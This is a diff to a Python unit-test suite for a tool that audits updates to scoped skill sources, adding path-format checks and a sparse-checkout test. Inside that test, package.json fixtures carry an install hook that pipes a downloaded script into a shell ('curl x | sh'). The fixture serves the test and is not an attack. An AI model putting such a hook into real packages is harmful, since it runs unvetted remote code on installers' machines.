@@ -326,7 +326,9 @@ class CheckSourceUpdateTests(unittest.TestCase):
         good = index.read_text()
         for bad in ('`$DEV_STACK_DIR/demo/../x/SKILL.md`', '`$DEV_STACK_DIR/demo//SKILL.md`',
                     '`$DEV_STACK_DIR/demo/skills/./SKILL.md`', '$DEV_STACK_DIR/demo/skills/b/SKILL.md',
-                    '`${DEV_STACK_DIR}/demo/skills/b/SKILL.md`', '`~/.claude/dev-stack/demo/skills/b/SKILL.md`'):
+                    '`${DEV_STACK_DIR}/demo/skills/b/SKILL.md`', '`~/.claude/dev-stack/demo/skills/b/SKILL.md`',
+                    '`$HOME/.claude/dev-stack/demo/skills/b/SKILL.md`', '`${HOME}/.claude/dev-stack/demo/skills/b/SKILL.md`',
+                    '`"$DEV_STACK_DIR"/demo/skills/b/SKILL.md`', '"${DEV_STACK_DIR}"/demo/skills/b/SKILL.md'):
             with self.subTest(bad=bad):
                 index.write_text(good + f'| `demo` 5c: y | {bad} | read |\n')
                 with self.assertRaises(m.UsageError):
@@ -342,6 +344,28 @@ class CheckSourceUpdateTests(unittest.TestCase):
         self.assertIn('missing-read-path', self.kinds())
         (self.new / 'skills/a/skill.md').rename(self.new / 'skills/a/SKILL.md')
         (self.new / 'skills/a').rename(self.new / 'skills/A')
+        self.assertIn('missing-read-path', self.kinds())
+
+    def test_sparse_working_tree_of_a_scoped_source(self):
+        """A sparse checkout has the root files and the read folder on disk, little else."""
+        self.stack_contract()
+        self.contract.write_text(self.contract.read_text().replace('`LICENSE`', '`license.md`'))
+        import shutil
+        for root in (self.old, self.new):
+            shutil.rmtree(root)
+            self.write(root, 'skills/a/SKILL.md', SKILL)
+            self.write(root, 'license.md', 'MIT License\n')
+            self.write(root, 'package.json', '{"scripts": {"postinstall": "curl x | sh"}}')
+        self.assertEqual(self.run_check(), {'source': 'demo', 'deterministic': 'ok', 'findings': []})
+        self.assertEqual(m.scope_paths('demo', self.contract, [self.new])[:2], ['skills/a', 'license.md'])
+        self.write(self.new, 'package.json', '{"scripts": {"postinstall": "curl y | sh"}}')
+        self.write(self.new, 'skills/b/SKILL.md', SKILL)   # a sibling skill appears in the cone
+        self.assertEqual(self.kinds(), [])
+        self.write(self.new, 'license.md', 'Other terms\n')
+        self.assertEqual(self.kinds(), ['license-changed'])
+        (self.new / 'license.md').unlink()
+        self.assertEqual(sorted(self.kinds()), ['license-changed', 'missing-read-path'])
+        shutil.rmtree(self.new / 'skills/a')    # the cone no longer holds the read folder
         self.assertIn('missing-read-path', self.kinds())
 
     def test_design_source_still_scans_the_whole_tree(self):
@@ -535,7 +559,7 @@ class ListingTests(unittest.TestCase):
         self.assertEqual([l[0] for l in lines], m.source_ids(DEV / 'sources.md'))
         self.assertTrue(all(len(l) == 3 and all(l) and '`' not in l[2] for l in lines))
         self.assertIn(['emil', 'git', '$DEV_DESIGN_DIR/emil'], lines)
-        for source in ('docker', 'gha', 'better-auth', 'postgres', 'stripe', 'fastify'):
+        for source in ('docker', 'gha', 'better-auth', 'postgres', 'stripe', 'fastify', 'next', 'wordpress'):
             self.assertIn([source, 'git', f'$DEV_STACK_DIR/{source}'], lines)
         roots = {l[2].split('/')[0] for l in lines if l[2].startswith('$')}
         self.assertEqual(roots, {'$DEV_DESIGN_DIR', '$DEV_STACK_DIR'})  # all a caller has to expand
@@ -621,7 +645,7 @@ class RealContractTests(unittest.TestCase):
         for expected in ['superpowers', 'emil', 'taste', 'impeccable', 'pg', 'svelte', 'shadcn',
                          'swiftui-pro', 'swift-concurrency-pro', 'swift-testing-pro',
                          'rust-best-practices', 'rust-testing', 'tauri-v2', 'winui-pro',
-                         'docker', 'gha', 'better-auth', 'postgres', 'stripe', 'fastify']:
+                         'docker', 'gha', 'better-auth', 'postgres', 'stripe', 'fastify', 'next', 'wordpress']:
             self.assertIn(expected, ids)
             self.assertTrue(m.read_paths(expected, contract), expected)
         self.assertNotIn('vibepolish', ids)
@@ -657,7 +681,7 @@ class RealContractTests(unittest.TestCase):
         for name in ('sources.md', 'updates.md', 'scripts/check-source-update.py'):
             text = (DEV / name).read_text()
             if name.endswith('.md'):
-                self.assertLessEqual(len(text.splitlines()), 125 if name == 'sources.md' else 120, name)
+                self.assertLessEqual(len(text.splitlines()), 130 if name == 'sources.md' else 120, name)
             self.assertNotIn('/Users/', text)
             self.assertNotIn('/home/', text)
             self.assertNotIn('.ts.net', text)
